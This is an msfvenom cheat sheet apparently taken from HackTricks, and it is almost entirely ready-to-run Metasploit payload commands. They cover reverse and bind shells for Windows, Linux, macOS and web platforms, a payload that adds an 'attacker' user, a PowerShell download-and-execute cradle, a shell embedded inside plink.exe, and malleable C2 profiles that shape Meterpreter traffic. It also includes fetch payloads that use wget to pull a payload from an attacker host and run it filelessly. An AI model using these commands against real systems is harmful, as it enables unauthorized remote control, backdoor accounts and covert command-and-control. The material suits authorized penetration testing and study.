---
title: "MSFVenom - CheatSheet"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/generic-hacking/reverse-shells/msfvenom.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: misc
---

## Basic msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

Use `-a` to select the payload architecture and `--platform` to select its target platform.[\[1\]](#references)

## Listing

```
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
These commands list the payload and encoder modules available in the installed framework.[\[1\]](#references)

## Common params when creating a shellcode

```
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
The flags shown here select bad characters, output format, encoder, and encoding iterations.[\[1\]](#references)

## HTTP(S) Meterpreter traffic shaping

Metasploit 6.5 added the `MALLEABLEC2` option to staged and stageless reverse HTTP(S) Meterpreter payloads. The profile can change URIs, user agents, request/response headers, connection-ID placement and supported body encodings/wrappers. Both the generated payload and its handler must load the **same local profile**. A staged payload’s initial request for the Meterpreter stage is not shaped, so prefer a stageless payload such as `windows/x64/meterpreter_reverse_https` when the first request must also match the profile.[\[3\]](#references)

```
msfvenom -p windows/x64/meterpreter_reverse_https \
  LHOST=10.10.10.10 LPORT=443 MALLEABLEC2=/opt/profiles/web.profile \
  -f exe -o reverse_https.exe
```
Configure the matching handler with the identical payload and profile:[\[3\]](#references)

```
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 10.10.10.10
set LPORT 443
set MALLEABLEC2 /opt/profiles/web.profile
run
```
Only the directives documented as implemented affect traffic; unsupported profile blocks may parse successfully while having no effect.[\[3\]](#references)

## **Windows**

**Windows**

### **Reverse Shell**

**Reverse Shell**

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell

```
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### Create User

```
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Shell

```
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Execute Command**

**Execute Command**

```
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encoder

```
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
**Encoding is not AV evasion:** encoders such as `x86/shikata_ga_nai` are primarily useful for satisfying bad-character constraints. Repeated encoding is not a reliable AV-evasion technique.[\[1\]](#references)

### Embedded inside executable

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## Linux Payloads

### Reverse Shell

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell

```
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)

```
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **MAC Payloads**

**MAC Payloads**

### **Reverse Shell:**

**Reverse Shell:**

```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Bind Shell**

**Bind Shell**

```
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Web Based Payloads**

**Web Based Payloads**

### **PHP**

**PHP**

#### Reverse shel**l**

**l**

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### Reverse shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### Reverse shell

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### Reverse Shell

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS

```
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Script Language payloads**

**Script Language payloads**

### **Perl**

**Perl**

```
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**

**Python**

```
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**

**Bash**

```
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
## Fetch payload adapters

Fetch payloads produce a command that makes an available target utility download and execute an underlying native payload. Their names follow `cmd/<platform>/<fetch-protocol>/<served-payload>`; HTTP(S), SMB and TFTP adapters are available, with downloader choices depending on the target platform.[\[2\]](#references)

For example, generate a Linux `wget` command that retrieves an x64 Meterpreter payload from port 8080 and connects it back on port 4444:[\[2\]](#references)

```
msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
  FETCH_COMMAND=WGET FETCH_SRVHOST=10.10.10.10 FETCH_SRVPORT=8080 \
  LHOST=10.10.10.10 LPORT=4444 -f raw
```
Start the **fetch handler** with the same settings; it hosts the generated ELF and also starts the handler for the served Meterpreter payload:[\[2\]](#references)

```
use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
set FETCH_COMMAND WGET
set FETCH_SRVHOST 10.10.10.10
set FETCH_SRVPORT 8080
set LHOST 10.10.10.10
set LPORT 4444
to_handler
```
Useful dependent options include `FETCH_PIPE=true` to emit a shorter HTTP(S) command where supported and `FETCH_FILELESS=shell`, `shell-search`, or `python3.8+` to execute a Linux ELF from an anonymous file descriptor. Fileless modes require Linux kernel 3.17 or later; inspect the exact adapter with `msfvenom -p <FETCH_PAYLOAD> --list-options` because supported combinations vary.[\[2\]](#references)

## References
